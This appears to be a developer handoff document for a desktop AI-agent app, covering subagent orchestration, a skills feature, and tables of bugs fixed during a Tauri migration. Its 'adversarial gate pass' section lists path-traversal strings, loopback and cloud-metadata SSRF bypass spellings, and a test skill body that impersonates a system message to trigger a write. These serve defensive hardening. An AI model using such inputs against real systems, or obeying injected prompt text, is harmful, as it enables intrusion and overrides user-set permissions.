* **Watch for the same shape elsewhere.** Three process-globals are now installed as a
  side effect of *building* something — `task_state` (above), `user_io` (by
  `install_question_bridge`, explicit, which is why it is the model to copy), and
  `jobs_registry` (a singleton, but one that owns live processes). A child session is
  the first thing that makes any of them wrong rather than merely untidy.
  **`subagent_registry` is now a fourth, and it is wired.** `SubagentRegistry.restart()`
  is called from `headless/server.py::_attach_session` — the same host path that
  re-installs `user_io`'s bridge for a new session, which every session replacement
  goes through (switch, new chat, startup restore). Switching conversations now
  cancels a running child and drops the listing, pinned by
  `test_restart_cancels_a_running_child_and_drops_the_listing` and two protocol tests
  in `test_conversations_protocol.py`. `workflow` can build on the registry.
* **Events need attribution before anything else.** `core/events.py` has one `EventBus`
  and events carry `turn_id`; the window's reducer pairs tool calls by `id` and appends
  to the message found by `turn_id` (`app/src/events.ts`). A child emitting the same
  event types would therefore *corrupt the parent transcript*, not merely look odd.
  **Decided, and the decision cost two window bugs to make.** The child keeps its own
  `turn_id` (the namespaced shape), and the window treats any turn that is not its own
  as foreign: the reducer tracks `activeTurnId` and ignores a foreign turn's creation,
  terminal and error frames. That is what keeps the parent transcript the only one on
  screen. It is also the hook where **nested UI** plugs in: rendering a child's work
  under its `subagent` card needs the core to say *whose* child a frame is (a
  parent/child field on the event), because foreign frames currently carry no link to
  the tool call that spawned them.
* **All five tools now exist**: `subagent`, `list_agents`, `interrupt_agent`,
  `send_message` and `subagent_fork` (all in `tools/subagent_tools.py`, registered in
  the load-bearing import block; `subagent`, `send_message` and `subagent_fork` in
  the mutating set, the other two in the read-only set beside `job_kill`). Phase 5
  built the first three; the two workflow verbs had to wait for the re-entrant loop,
  because a child that answered once and finished had nobody to send a message *to*.
  The synchronous turn loop is what made that the honest Phase 5 shape.
* **Decided: budgets.** The child gets the parent's per-turn budget as its own
  ceiling (its own counter); the `subagent` call itself spends one of the
  *parent's* slots, so a fan-out is bounded by the budget the user set. A child
  running over 120s is cancelled and the timeout is SAID in the result.
* **Decided: permission cannot escalate.** The child inherits the parent's mode
  and permission objects directly — there is no parameter a model could set to
  widen them. Registering the tool happened inside the existing block in
  `tools/__init__.py`; the import order there is still load-bearing.
* **The live window question is answered — with a capture, not a human.** The unit test
  pinned that child frames cannot corrupt the *core* transcript, but "whether the
  child's message frames render anywhere, duplicate, or vanish in `MessageList`" was
  unknown to a person. `scripts/capture_child_frames.py` runs a real parent turn that
  calls `subagent` against a stub provider and prints every frame the window receives;
  replayed through the reducer it showed the child rendering as an extra, unlabelled
  assistant bubble and its `turn.finished` clearing `busy` mid-parent-turn. Both are
  fixed, and the captured sequence is a test fixture in `events.test.ts`. The nested
  view's *pixels* were checked separately in `app/nested-preview.html` (the real
  `MessageList` against the real stylesheets). **What is still not watched is the live
  GUI with a real provider bound** — a real child streaming into its card in the
  running window.
* **Done: nested UI.** A child's frames now carry `subagent`/`parent_call_id`
  (the latter read from a `ContextVar` the orchestrator sets around execution),
  and the reducer folds them into the spawning call's card: the child's tools,
  its answer, and whether it is still running, rendered as one indented block
  (`SubagentWork` in `app/src/MessageList.tsx`, `.subagent*` in
  `app/src/styles/tool-calls.css`). The card's own status still reports the
  parent's call — the child finishing does not finish it. See "Nested subagent
  work" at the end.
* **The "no frontend work" streak ended, as predicted.** `ToolCall` gained `child`
  (`SubagentChild` in `app/src/events.ts`), `ToolRow` gained a branch, `tool-calls.css`
  the block's rules, and `MessageList.test.tsx` its first `ToolRow` markup tests (four
  of them). One subtlety worth keeping: `copyMessages` now deep-copies the child and
  its tool list — a nested object written through by a shallow copy is the same state
  corruption the deep copy exists to prevent.

### Phase 6 (workflow): what landed, and what remains

**Landed, with tests through the real entry points.**

* **The re-entrant child loop.** `SubagentRegistry.spawn` still builds a child; what
  changed is that a child's turn is entered *per turn* rather than once per child.
  `subagent_tools._drive_child` is **the one place a child's turn starts**, for all
  three verbs: `subagent` (a fresh child and its brief), `send_message` (an existing
  child and the next thing to say), `subagent_fork` (a copied child and the brief the
  copy exists for). Attribution, the serial task, the deadline and the three failure
  shapes live in that one function — `test_workflow.py` asserts a follow-up fails
  *exactly* the way a first turn does, which is the test that would catch the loop
  being forked per verb.
* **`send_message` and `subagent_fork`**, registered in
  `tools/__init__.py`, in the mutating set beside `subagent` (each runs a real child
  turn under the parent's mode and permission). `subagent_fork` refuses a source that
  is still writing its conversation. Both are on the wire: the tool-count tripwire in
  `test_tool_wire_format.py` / `test_user_questions.py` is **39** now.
* **`tools/context.py` — one owner for "what is this call part of".**
  `ToolContext{session, call_id, permission}`, a `ContextVar`, published by
  `AgentSession._run_turn` (the session, for the turn) and
  `ToolOrchestrator._execute_tool_async` (the call, and the permission), composing
  by nesting. This replaced three separate back-channels: the module global in
  `subagent_tools` holding the running session, the short-lived `ToolCall`
  `ContextVar` (added and then folded in during this phase, so `tools/base.py` shows
  no net diff against `HEAD`), and — new in this phase — the permission, which had
  been two module booleans pushed into `shell_tools`. `folder_manager` deliberately stays put;
  moving the folder means rewiring `file_tools`, `search_tools` and `shell_tools` at
  once, which is its own pass.
* **Ownership debt named by the audit, fixed.** (a) The function-local
  `AgentSession` import is gone: `spawn` builds the child from `type(parent)`, so no
  lazy import and no import-order coupling, and a subclass gets its own class back.
  (b) The **parallel gating booleans** are gone: `shell_tools._ALLOWLIST_BYPASS` and
  `_HOST_EXECUTION` (two booleans derived from one level, pushed into a tool module
  the moment it changed) are replaced by `ToolContext.permission`,
  published per call, read by `allowlist_bypassed()` / `host_execution()`. One
  authority, and a parent and its child cannot share an answer any more.
* **A real bug the new test found.** `SubagentRegistry.final_answer` scanned the
  whole transcript, so a follow-up whose provider died answered with the *previous*
  turn's text — `send_message` reporting stale work as the reply it had just asked
  for. It now takes `since=` (the transcript length when this turn started) and reads
  only what this turn wrote. Pinned by
  `test_a_follow_up_failure_reads_like_a_first_turn_failure`, which fails on the old
  body.
* **The window needed no new routing, and that is now pinned.** The reducer folds
  child frames into the card found by `parent_call_id`, never by tool name, so a
  follow-up nests under the `send_message` card for free. `events.test.ts` gained a
  test that would fail if that ever started keying off the `subagent` name.
* **Fan-out: several children inside one turn.** No new verb was needed. The session
  already runs a batch of independent tool calls concurrently
  (`AgentSession._execute_batch`), so three `subagent` calls declared in one assistant
  message are three concurrent children, and a batch mixing `subagent`,
  `send_message` and `subagent_fork` works the same way. What landed is the **bound**,
  in `_drive_child` — the same single owner that runs a child's turn:
  `MAX_CONCURRENT_CHILDREN = 4` as a *queue* (a verb with no free slot waits rather
  than being refused, so a model that asks for six children gets six answers and
  never has to guess the limit), `MAX_CHILDREN_PER_TURN = 8`, and
  `MAX_SUBAGENT_DEPTH = 1`. The deadline is unchanged and, importantly, now measures
  the **turn rather than the queue wait**: the slot is taken inside the child's own
  task, so a child that waited its turn still gets its full `CHILD_TURN_TIMEOUT_S`.
  Per-child seriality survives as its own guard — one child, one turn at a time,
  because a turn appends to that child's transcript. Attribution needed no change and
  is proved under load: with four children streaming interleaved, each card keeps its
  own text (a core test and a reducer test, both mutation-checked against a routing
  bug).
* **The budget question, decided.** *Does the parent's tool budget bound concurrent
  spend?* Yes when it is set, and explicitly backstopped when it is not:

  * **It usually does, mechanically.** Each of the three verbs *is* one of the
    parent's tool calls, counted before it runs, so a parent with a budget of ten
    cannot start more than ten children in a turn. This was already true and is
    already tested by `test_tool_call_budget.py`.
  * **It need not**, because `max_tool_calls = 0` means "no limit" — a real setting.
    That is what `MAX_CHILDREN_PER_TURN` exists for: without it, one assistant
    message could declare a thousand `subagent` calls and the queue would work
    through them, four at a time, forever. The refusal names the limit and tells the
    model the child still exists and can be used later with `send_message`.
  * **It does not bound what the children spend, and should not.** A child's budget
    is its own (inherited as a ceiling, counted separately) — the Phase 5 decision.
    So a fan-out's cost is bounded by `MAX_CHILDREN_PER_TURN x the child's own
    budget`, not by the parent's alone. That is stated in the constant's docstring
    rather than left implicit.
* **`MAX_SUBAGENT_DEPTH` is now the reason nesting is refused, not a side effect.**
  The serial gate this phase removed was the *only* thing stopping a child from
  spawning a child — a child running its own turn counted as "another subagent
  running", so the refusal was real but stated as a concurrency fact. The rule is
  now its own check with its own words and two tests (a unit one and a real-turn one
  where the parent reads the refusal in its own tool result). The handoff had both
  this claim and a contradictory "no depth limit" bullet; the serial gate's behaviour
  is the one the code actually had, and the contradiction is resolved here.

**What remains open in this phase.**

* **The live GUI with a real provider is still unwatched.** Everything here is pinned
  by tests and by replaying captured frames through the reducer, but no human has seen
  a follow-up, a fork, or four children streaming at once in the running window. Same
  standing item as Phase 5.
* **`subagent_tools.py` is now 1056 lines and wants splitting.** It holds four
  different things: the registry (who exists), the scheduler (how many run at once),
  the child-turn loop (`_drive_child` and its failure shapes), and the five tool
  classes. Every one of them is in the right *place* — the phase's point was that a
  turn has exactly one owner — but they no longer belong in one *file*. The natural
  cut is `subagents.py` (registry + scheduler + loop) with `subagent_tools.py`
  keeping only the tools; the constants and `subagent_registry` are imported by name
  from several test files and `headless/server.py`, so the move needs re-exports or a
  sweep. Not done here because it is a pure move and this pass's budget went to the
  behaviour.
* **The bounds are module constants, not settings.** `MAX_CONCURRENT_CHILDREN`, `MAX_CHILDREN_PER_TURN` and `MAX_SUBAGENT_DEPTH` cannot be changed by the user; a window
  that wants to offer "allow more subagents" has no dial to turn. Deliberate for now
  — the numbers are conservative and a settings surface needs a UI decision — but it
  is the obvious next step if the caps ever bite.
* **No aggregate spend bound across children.** See the budget bullet: eight children
  with a budget of ten each is up to eighty child tool calls under one parent turn. Nothing
  caps that total; the per-turn child count is a proxy for it, not a measurement of it.
* **`list_agents` reports per-turn usage, not lifetime usage.** Each turn resets the
  child's counter (`_run_turn_body` does that for the parent too), so a child talked
  to three times shows the calls of the last turn. Nobody has decided whether that is
  the right number to show.
* **One of the two adjacent findings is now closed, the other is not.** The
  "no depth/count limit on subagents spawning subagents" half is closed by
  `MAX_SUBAGENT_DEPTH` / `MAX_CHILDREN_PER_TURN` above. **`Orchestrator._execution_history`
  still grows without a cap** (`get_history` / `clear_history` have no callers
  anywhere), and it holds full tool arguments — the one item on this list that is now
  purely a leak rather than a policy question.

### Phase 7 (skills): what landed, and what remains

**The capability behind the `skills` mode, and the `/` syntax the composer has been
advertising since it had a placeholder.** Nothing was invented to get there: the two
tools follow `planning_tools.py`'s shape (read-only verbs, `ToolCategory.UTILITY`,
`folder_required = False`), the mode gate is the existing read-only set, the window
gained no new event type, and the one piece of prompt assembly joins the plan inside
`AgentSession._messages_with_system` -- for the reason that method already gives.

* **A skill is one Markdown file: `<project>/.tonyagent/skills/<name>.md`, or
  `<app data>/skills/<name>.md`.** Optional `---` front matter with `name:` and
  `description:`; everything after it is the procedure. `core/skills.py` owns the
  format. It is deliberately **not** YAML: the project has no YAML dependency, and a
  parser that accepted nested structures would advertise a shape nothing reads. The
  project's file beats the user's on a name collision, and the *shadowed* file is
  reported rather than ignored -- a skill that exists and does not run is exactly the
  silence this project keeps having to unpick.
* **A file that cannot load is a problem with a reason, not a skip.** `parse_skill`
  raises with the fix in the sentence: an unclosed `---` fence ("a skill with no header
  needs no '---' line at all"), an unknown front-matter key, no body, a name that could
  not be typed after a slash, or a body over `MAX_SKILL_CHARS` (24,000 -- a prompt
  budget, so the refusal names the number). `list_skills` prints them, its card counts
  them ("2 skills, 1 broken"), and the composer's RPC ships them.
* **Two tools, registered in the load-bearing import block, both in the read-only
  set** so they exist in every mode: `list_skills` (name, purpose, root, path, and the
  broken files) and `run_skill` (the procedure, carrying `PERMISSION_NOTE` and, on a
  bad name, the list of good ones -- "no such skill" alone would only produce another
  guess). Neither requires a project folder: the user root works with no project open.
  The wire tripwire is **41** now.
* **`/name arguments` is resolved by the core, not by the model.** The decision was
  made where the precedent already was: `_messages_with_system` appends the plan to the
  prompt because it is "not something either party *said*", and a skill invocation is
  the same class of thing -- so the procedure is appended there *and* `self.messages`
  keeps the line the user typed. A model that never calls `run_skill` still follows
  `/review`, which is the whole difference between a syntax and a suggestion; and the
  saved conversation stays readable instead of growing a pasted document per
  invocation. Resolution lives in `_run_turn_body` rather than in `send`, because
  `send` is not the only way into a turn -- a child's turn appends its brief and calls
  `_run_turn` too, and a `/name` in a brief means the same thing it means at the top.
  The invocation is cleared in the turn's `finally`: it is an *invocation*, not a mode.
* **A message that merely starts with a slash is prose.** `/usr/local/bin` and a typo
  both pass through untouched -- hijacking a path would break pasting one, and refusing
  it would put a refusal in front of someone asking for nothing. What tells a user the
  name is wrong is the composer's own list while they type it. This is tested in both
  directions, which is why `invocation_for` takes its folder as a **required**
  argument: a default of `None` reads as "the current project" and means "the user root
  only", a bug that looks exactly like a skill not existing.
* **What a skill cannot do is the design.** Loading one is a read, so it is allowed in
  Plan mode; the *steps* then run with the tools the mode already allows. The proof is
  a real turn in Plan mode that loads a procedure saying "write the file", watches the
  write come back `write is not available in Plan mode` from the orchestrator, and
  checks the file does not exist. A skill is also never turned into a filesystem path:
  the model's string is looked up in the discovered set, never joined to a directory.
* **The composer's half is the picker.** `/` opens a menu of the real list, arrows move
  the highlight, Tab or Enter writes `/name ` into the field, Escape closes it and
  leaves the text alone, and Enter still *sends* whenever nothing matches -- the case
  that matters, since a path in a composer is prose. It asks the core for the list when
  it opens rather than at mount, so a skill saved in the editor a second ago is there,
  and there is nothing to invalidate. `skills.list` is the RPC; the reply carries names
  and paths and **no bodies**, because a listing answers "what have I got" and every
  procedure would be the whole store read again on every keystroke.
* **Proved through its real entry points.** `tests/unit/test_skills.py` (45 tests) covers
  the format, the two roots and their shadowing, every refusal, the token rules, both
  tools, the `skills.list` RPC, and three real turns with a scripted provider: a
  `/review` message (the procedure in the prompt, the typed line in the transcript, the
  block gone on the next turn), a turn that calls `list_skills` then `run_skill` and
  whose two cards carry "1 skill" and "skill: review", and the Plan-mode refusal above.
  Load-bearing by mutation: deleting the prompt append fails four tests, and treating an
  unknown name as a skill fails the path test. `scripts/e2e_all_tools.py --fast` gained
  four checks (58 now) against a real project folder, including the shadowing-free
  "this file is broken" report. The TypeScript suite gained 18 (626 now).
* **The pixels were measured rather than eyeballed, and that is a real caveat.**
  `app/skills-preview.html` renders the real composer with the real stylesheets and
  four states; in the running dev server the menu measured 6px above the field, inset
  to the same 19px the field's text uses, `position: absolute`, `z-index: 6`, on the
  panel glass, with ArrowDown moving the highlight and Escape closing it -- all read
  out of the live DOM. **A screenshot could not be taken** (the preview webview did not
  composite, and neither a reload nor a reopen helped), so no human has *looked* at
  this menu. Same standing item as the nested subagent UI.

**What remains open in this phase.**

* **The `@` half of the placeholder is still a lie.** `@ for threads or files` was
  advertised in the same sentence as `/ for skills` and nothing handles it; that is the
  next thing a user will notice, and the same argument applies -- either wire it or take
  it out of the placeholder.
* **The picker only opens on a message that is nothing but the token.** It requires the
  whole field to be `/name`, so `/` typed after a word does not offer anything. That is
  deliberate (mid-sentence `/` is usually a path) but it is also why the menu cannot be
  reached to *insert* a command into a sentence that already exists.
* **Skills cannot say anything about themselves but their name and purpose.** No
  argument hint (so the field never suggests what `/review` wants), no list of the tools
  a procedure expects, and no way to mark one as needing a mode -- a skill whose steps
  need writes is discovered as available in Plan mode and refused at the write, which is
  honest but late.
* **One file per skill, at the top level of the skills directory only.** No
  `SKILL.md`-in-a-directory layout, no nesting, no `includes`. The flat file is
  discoverable with `ls` and that was the deciding argument; nesting is a change to
  `discover_skills` whenever somebody wants it.
* **Nothing caches, on purpose.** Discovery is a directory listing and a few small
  reads on every `list_skills`, every `run_skill` and every turn whose message begins
  with a known `/name`. The alternative is a cache with an invalidation bug in it -- the
  user edits a skill and the next turn uses the old one -- but it does mean a project
  with a few hundred skills would be read once per turn.
* **The menu is not mode-aware.** It lists what exists, not what this mode can carry
  out, and it never says which skills come from the user root vs the project beyond the
  `user` chip on a row.

### The adversarial gate pass: the surface swept, three gate holes fixed, and the recorded leak closed

**What was asked of it.** Every registered tool had its gates probed as a *class*
rather than one at a time — mode and permission refusal, the destructive
confirmation with nobody to ask, the sandbox refusal when nothing is attached,
path confinement, the network guard, cancellation and cleanup — plus the two
things that had never been probed adversarially at all: the skill store (paths,
malformed files, oversize and non-regular files, and what a *hostile* body can
make the model do) and the workflow fan-out (concurrency, the depth and per-turn
bounds, cancellation, attribution).

**What was measured clean**, each pinned in `tests/unit/test_tool_gate_surface.py`
(new, 23 tests) and driven through `ToolOrchestrator.execute_tool_async` — the
layer that actually decides, never the tool body:

* the mode × permission matrix for all 41 tools on all 16 combinations: a
  forbidden call is refused *and the body never runs* (a recorder stands in for
  every tool's `execute`), the two axes intersect rather than override, and
  Build + Full reaches every registered tool — no tool is in no mode;
* all four destructive tools (`delete_file`, `edit`, `execute_command`,
  `write`) refuse with no bridge, refuse on No, refuse when the answer never
  comes, and leave no pending prompt behind — with a denied `delete_file`
  measured on the file itself, not only through the recorder;
* 12 path parameters across 12 tools refuse `../`, `sub/../../`, a
  Windows-spelled escape and an absolute path outside, with a sentinel file
  outside the project to prove nothing was read and a planted path to prove
  nothing was written (and an approving bridge, so the confirmation gate is not
  what passes it); `glob`'s escaping *pattern* has its own named test, since that
  was the historical hole;
* `execute_command` at High, approved by the user, with an allow-listed command,
  is refused with the one `NO_RUNTIME` sentence — and the same command at Full
  runs on the host, so the rung is measured as the difference; all 14
  sandbox-required tools answer with that same sentence;
* stopping a turn with six children in flight ends the turn, cancels every
  child, leaves no `subagent:` task behind, and restores the concurrency permits
  (asserted behaviorally: the *next* fan-out still peaks at exactly 4);
* a child still *queued* for a slot is interruptible through `interrupt_agent`,
  never calls the provider, and the child behind it still runs.

**Four fixes, each with a test that fails on the previous code:**

1. **The guard raised instead of refusing.** `urlparse` raises on `http://evi[l]/`
   and `http://[::1/`, and the `ValueError` escaped both network tools' own error
   handling — the model saw ``Tool execution failed: Invalid IPv6 URL``, a tool
   *failure* with no address and no fix named, and inside the httpx request hook
   the same raise would have surfaced on a redirect hop. `_internal_host_refusal`
   now refuses a URL it cannot parse, in its own words.
2. **The guard allowed three spellings of loopback and a metadata range.**
   `0177.0.0.1`, `0x7f000001` and `127.0.0.1.` were allowed because the guard
   allowed whatever the *resolver* declined to resolve, and this machine's
   resolver declines all three (measured with a listening socket: they do not
   connect here, which is luck, not a gate — on glibc `inet_aton` expands both
   numeric spellings to 127.0.0.1). `100.64.0.0/10` was allowed too: RFC 6598
   shared space, which contains Alibaba Cloud's metadata address
   `100.100.100.200`, and which `ipaddress` calls neither private nor reserved.
   Swapping the predicate for `not is_global` was rejected on the evidence:
   NAT64's `64:ff9b::/96` is `is_global` *and* reserved, so that change would
   have un-blocked it. The shapes are refused before resolution now and the /10
   is refused by name; real names that merely look hex-ish (`cafe.beef`,
   `dead.beef`) are pinned as *allowed* so the fix cannot over-block.
3. **The skill size cap ran after the read.** A 4 MB `.md` beside the good ones
   was read into memory in full — on every `/name` turn and every `list_skills` —
   and only then refused. `load_skill_file` now `stat`s first (`MAX_SKILL_BYTES`,
   4 bytes per character), names a non-regular file as such, and the test proves
   the read never happens by making `Path.read_text` raise.
4. **`_execution_history` grew without a bound** — the item this file already
   listed as "purely a leak rather than a policy question". It holds every
   executed call's **full arguments** (a `write`'s file contents included), has
   no reader anywhere (`get_history`/`clear_history` have no callers), and a
   fan-out made it easy to reach megabytes. It is a **200-entry ring** now
   (`EXECUTION_HISTORY_LIMIT`), and the test asserts both the cap and that the
   *recent* end is what survives — dropping the newest calls would be a cap that
   answers the wrong question.

**And one latent suite bug the pass uncovered:** a plan-mode test in
`test_skills.py` leaves the process-wide `tool_orchestrator` in Plan
(`AgentSession.set_mode` pushes it there — correct in the app, where one session
owns the window) and ten subagent tests in later files failed with "subagent is
not available in Plan mode". `test_modes_and_diffs.py` already had an autouse
fixture for exactly this; `test_skills.py` has one now.

**Hostile input to the skill store, pinned in `test_skills.py` (52 tests now):**
oversize refused without a read, a *directory* named `notes.md` reported as not a
regular file, invalid UTF-8 read with replacement characters instead of crashing
discovery, a filename that cannot be typed reported by name, a broken project
file not hiding a good user one under the same name, a skill named `run_skill`
not shadowing the tool, and a body that impersonates a system message and closes
the prompt block's own fence — which still gets its write refused by the mode's
gate, because prompt text cannot grant anything.

**What is *not* claimed.** Docker is down here: the non-fast e2e run — which
starts the sandbox and exercises the browser and shell paths for real — did not
run, and nothing here is evidence about a *contained* command. No real provider
was used, so every model turn in these tests is scripted. Creating a file symlink
needs a privilege this process does not hold, so the symlink confinement test
reports itself **skipped** rather than passing. The “phantom child” behavior a
refused fan-out leaves behind (a refused `subagent` is still a named, idle
handle) is existing design — pinned in `test_subagents.py` as “the child exists
and never ran … addressable and reusable” — so it was examined and deliberately
left alone.

---

## 1. What changed most recently

### 1.1 Bugs found and fixed while preparing the migration

These were live production bugs, not theoretical:

| Bug | Symptom | Root cause | Fix |
|---|---|---|---|
| **Tools never executed** | Every tool call silently did nothing | `MainWindow._generate_response` is `async def` but called the *sync* `execute_tool()`, which raises `RuntimeError` inside a live event loop. A blanket `except Exception` swallowed it. | `await execute_tool_async()` |
| **`CTkComboBox is not a valid model ID`** | 400 from OpenRouter; status bar showed `openrouter/CTkComboBox` | `CTkComboBox.get()` returns **its own class name** when nothing is set, and the model combo was built with `values=[]` | `PillComboBox.get()` override returns `""`; `ProviderFactory._is_valid_model_id()` rejects implausible ids |
| **Truncated key accepted** | `401 User not found` for a 35-char OpenRouter key | `MIN_KEY_LENGTH = 20` was a global floor; a real key is 73 chars | `KeyLengthError` + per-provider `key_length` + `normalize_key()` |
| **Key leaked to disk** | plaintext key in `scripts/k2.log` | a diagnostic script printed `repr(key[7:])` | log deleted, script rewritten, key rotated by the user |

The `execute_tool` bug is the one to remember: **the app had never run a tool.**
An older `NEXT_SESSION.md` flagged it as "unverified"; it had been real for the
whole project.

### 1.2 Bugs found while building the Tauri app

Same character as 1.1: each one produced a build or a window that looked
correct and silently did nothing.

| Bug | Symptom | Root cause | Fix |
|---|---|---|---|
| **Frozen core died at startup** | sidecar exited before serving a request; `ModuleNotFoundError: No module named '3c22db458360489351e4__mypyc'` | `tomli` is mypyc-compiled and each mypyc package ships its own hash-prefixed `__mypyc` runtime. `collect_all()` only walks *inside* the package dir, so the top-level runtime was never collected. The hash changes every release, so it cannot be named. | `scripts/sidecar.spec` globs `*__mypyc*.pyd` from site-packages |
| **Sidecar never spawned** | window opens, says "disconnected", no error | `makeSidecarTransport` used `require()`, which does not exist in an ES module. The fallback `globalThis.__tauriRequire` was never defined by Vite either, so the spawn threw. | dynamic `import()` — resolves in Node for the tests and in a real chunk for the app |
| **`write`/`kill` on the wrong object** | type errors masked by `any` | `spawn()` returns a `Child` that owns stdin and kill(); `Command` only emits output. The code called them on `Command`. Once the `any` was removed the compiler caught it. | hold both; `child.write` / `child.kill` |
| **Process exit went unnoticed** | UI stuck on "connected" after the core died | exit is the Command's `close` event, not a Child method | subscribe to `close` **and** `error` |
| **Config in the wrong directory** | `failed to watch app\Cargo.toml` | in Tauri v2, `tauri.conf.json` and `capabilities/` belong inside `src-tauri/` | moved |
| **Three separate naming mismatches** | three distinct runtime errors, all reading as "disconnected" | `externalBin`, `Command.sidecar()` and the capability `allow` list must all carry the *same* string, and Tauri appends the triple itself | all three are `binaries/tonyagent-core` — see section 3 |
| **stdin rejected by ACL** | sidecar starts, every request fails `plugin:shell\|stdin_write not allowed by ACL` | `stdin_write` is a separate plugin command from `spawn` | added `shell:allow-stdin-write` and `shell:allow-kill` |
| **Sidecar build script crashed** | `NameError: name 'ensure_external_bin' is not defined` | a rename updated the *call* but left the *definition* on the old name, so the script died after an otherwise successful 45 MB build | both sides renamed; a definition-vs-call check guards it |
| **Window stuck on "disconnected" under StrictMode** | banner `Backend is not running`, while a working sidecar ran unowned in the background | React 19 StrictMode mounts, unmounts and remounts every effect, so `start -> stop -> start` genuinely races. A sidecar's exit event is delivered *asynchronously*, so the one just killed reported "exited" **after** its replacement was assigned, and `onExit` nulled `this.transport` unconditionally - disposing the healthy new backend. | `onExit` returns early unless `this.transport` is still its own transport; `start`/`stop` are serialised through one promise chain |
| **Sandbox ran but could not read its own workspace** | `search` and every file tool answered `No project folder selected` while the container was mounted and healthy | `start_sandbox(path)` mounts the container but never called `folder_manager.set_folder`. Only the Tkinter UI did, so the sidecar had a sandbox and no project | `_h_sandbox_start` registers the folder **before** starting, so a bad path fails before a container exists |
| **Tool arguments were echoed into the on-screen log** | the log strip showed `write_file({'path': 'a.py', 'content': <the entire file>})` | the orchestrator interpolated `tool_call.arguments` whole, and that log is rendered in the React UI *and* written to stderr. A user who asked the agent to write a config holding a credential saw it echoed back -- the same leak Phase 2 closed for API keys | `_summarise_args`: values over 24 chars become `<N chars>`, containers become `<dict>`. Paths survive, contents do not |
| **Every `schedule_on_ui` callback was silently dropped under the sidecar** | LOG events never reached the React UI; the log strip only showed stderr and looked fine | the queue is drained only by `process_ui_queue`, which returns immediately when `_ui_root` is None -- and there is no Tk root under Tauri. It *looked* correct because loguru writes the same message to stderr independently | call through immediately when there is no UI root. This is the second time this layer ate a callback |
| **`events.ts` mutated the state it was given** | invisible while every caller replaced the whole object; corrupts any `useMemo` dependency or replayed event | `applyEvent` did `messages.slice()`, copying the array but not the messages, so `target.tools = [...]` wrote through to the caller's state | `copyMessages` deep-copies each message and its tools. Found by the first `events.test.ts` |
| **`tauri dev` died at startup** | `EBUSY: resource busy or locked, watch '...build_script_build.exe'` | Vite's watcher walks the project root, including `src-tauri/target/`. Cargo holds those `.exe` files open and `fs.watch` fails on Windows, killing Vite and taking the dev command with it | `server.watch.ignored` excludes `src-tauri/**` |
| **A saved key had no effect** | after saving the OpenRouter key, the first message was rejected `no provider configured`, while `state` cheerfully reported provider `openrouter` | the core session starts with a provider *name* but no provider *object*; only the settings panel's Apply button ever called `bind_provider`. Neither startup nor a key save bound one, so the UI showed a provider it could not actually use | `App` binds on startup and rebinds after a key save (which also rebuilds the provider, clearing an HTTP client cached before the key existed) |
| **`No models provided` when no model was chosen** | binding a provider without picking a model sent an empty model id and the API rejected the request | `ProviderRegistry.create` passed `model=""` explicitly, clobbering every provider's constructor default (`openrouter/auto`, `gpt-4o-mini`, `claude-3-5-sonnet-20241022`, ...) | omit an empty model so the class default applies; `session.bind_provider` now records the *resolved* model so `state` agrees |
| **"Request URL is missing an 'http://' or 'https://' protocol"** | a scheme-less Base URL ("openrouter.ai/api/v1") surfaced as a network error on the first message, with a hint about VPNs and firewalls | the value was passed straight to httpx as the request URL. `LLMClient` only substitutes the dialect's default when the base URL is *empty* | `normalize_base_url()` rejects a scheme-less value at bind time with an actionable message and strips a trailing slash |
| **The test suite overwrote the user's own config.toml** | after Phase A made `bind_provider` persist, running the suite silently reset the saved model to `openrouter/auto` and pointed the next launch at `https://gateway.internal/v1` | `test_bind_provider_reports_a_custom_base_url_and_state_remembers_it` drives the *real* handler, so it is a real writer -- and only the two persistence test files redirected `get_config_path`. There was no `tests/conftest.py` at all, so nothing made it structurally impossible, and a green suite is not a warning | a session-wide autouse fixture redirects `migration.get_config_path`; a test asserts the real file's bytes are unchanged across a real bind. The per-test fixtures stayed: they exist to *inspect* the file, not merely to survive writing it |
| **A fresh sidecar reported a provider it had not bound** | the status bar showed `openrouter / openrouter/auto` while every message was rejected `no provider configured` | `_h_state` echoed `session.provider_name`, which `AgentSession` sets at construction with `provider = None`. Same user-visible lie as an unsaved key, from the opposite direction -- and it is what made the `gateway.internal` corruption above look like a real setting rather than a bug | `state` reports provider/model/base_url only when `provider is not None`, plus an explicit `bound` flag; the status bar turns "not bound" into a clickable prompt. The frontend's startup rebind, which existed only to paper over this, is gone |
| **Two processes, two `config.toml` files** | the app launched reporting `No saved provider; starting unbound` while a correct config existed, and pressing Apply in Settings wrote a 101-byte file containing only `[provider]` -- the user's allowlist, theme and sandbox settings were nowhere in it | `get_config_dir()` resolves `APPDATA`, and on Windows that is **not one answer for all processes**. A Microsoft Store Python is a *packaged* app, so Windows redirects it to `AppData\Local\Packages\PythonSoftwareFoundation...\LocalCache\Roaming`; the PyInstaller sidecar is not packaged and gets the real `AppData\Roaming`. Every shell command and every pytest run in this repo therefore edited a file the app never reads -- and it is invisible because both files are valid, both are called `config.toml`, and the failure looks exactly like "nothing was ever saved" | the full settings were merged into the app's real config; `build_session` now logs the path it reads, so the divergence is visible in the log strip instead of needing a filesystem search; a test asserts the log names the file. **Any future store-vs-app config discrepancy: check `AppData\Local\Packages\*\LocalCache\Roaming` before concluding data was lost** |
| **A failed turn left an empty assistant bubble** | with a rejected key the error banner rendered correctly *and* an empty bubble sat under it, so the transcript read as a broken UI | `turn.started` creates the assistant bubble eagerly so the first delta has a home, and `turn.finished` dropped a placeholder the core never wrote to. `turn.failed` and `error` did not -- and those are the paths a new user hits first, because a wrong key is the first thing a new user has | one `dropEmptyAssistantMessages` helper called by all three terminal events. Found by driving the **packaged** app with a credit-exhausted key, not by a test |

The pattern worth keeping: **the sidecar's stderr is the only place core-side
failures appear**, because stdout is protocol-only. The React UI now renders it
in a log strip, and the error banner shows Tauri's exact message. Without that,
every one of the above presented as an unexplained "disconnected".

### 1.3 Phase 1: the disabled rail icons

The Sandbox and Settings rail buttons were grey placeholders. Both now open one
`SettingsPanel`, because the project folder and the model answer the same
question - "what is this window working on" - and two modals would mean two
places reaching the same core methods. Search stays disabled: it needs a real
core method, and a UI that filters its own transcript is the kind of
presentation-only control this project keeps having to unpick later.

What was added:

| Piece | Why it exists |
|---|---|
| `app/src/dialog.ts` | `pickFolder()` over `@tauri-apps/plugin-dialog`, lazily imported for the same reason `backend.ts` does it - a top-level import would make the protocol tests require Tauri |
| `app/src/SettingsPanel.tsx` | folder picker, sandbox start/stop, trust toggle, provider + model selects, API key field (Phase 2) |
| `app/src/SearchPanel.tsx` | project-wide regex search (Phase 2) |
